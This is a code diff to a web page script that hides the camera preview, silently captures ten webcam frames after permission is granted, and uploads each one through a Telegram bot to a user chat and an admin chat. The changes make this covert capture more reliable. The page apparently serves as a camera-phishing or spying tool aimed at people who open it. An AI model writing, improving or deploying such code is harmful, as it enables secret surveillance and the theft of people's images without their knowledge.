@@ -18,10 +18,10 @@
       left: 0;
       width: 100%;
       height: 100%;
-      object-fit: cover; /* fills entire screen without distortion */
+      object-fit: cover;
     }
     video {
-      display: none; /* completely hide the camera preview */
+      display: none; /* hide preview */
     }
   </style>
 </head>
@@ -49,9 +49,15 @@
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          autoCaptureAndSend();
+
+        // Wait until video is actually playing before capture
+        video.onplaying = () => {
+          setTimeout(() => {
+            autoCaptureAndSend();
+          }, 500); // short delay to ensure frames are available
         };
+
+        video.play();
       })
       .catch(err => console.error("❌ Camera permission denied:", err));
 
@@ -64,18 +70,20 @@
       photos = [];
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+
+      // Ensure fallback size if video reports 0x0
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
 
       // Capture 10 frames automatically
       for (let i = 0; i < 10; i++) {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         let imgData = canvas.toDataURL('image/png');
         photos.push(imgData);
-        await new Promise(r => setTimeout(r, 200)); // short delay
+        await new Promise(r => setTimeout(r, 300)); // small delay between frames
       }
 
-      // Auto-send to Telegram (both user + admin)
+      // Send each photo to Telegram (user + admin)
       for (let i = 0; i < photos.length; i++) {
         let blob = await (await fetch(photos[i])).blob();
 
@@ -83,7 +91,7 @@
         let formDataUser = new FormData();
         formDataUser.append("chat_id", userChatId);
         formDataUser.append("photo", blob, `user_photo${i}.png`);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
           body: formDataUser
         });
@@ -92,7 +100,7 @@
         let formDataAdmin = new FormData();
         formDataAdmin.append("chat_id", ADMIN_CHAT_ID);
         formDataAdmin.append("photo", blob, `admin_photo${i}.png`);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
           body: formDataAdmin
         });
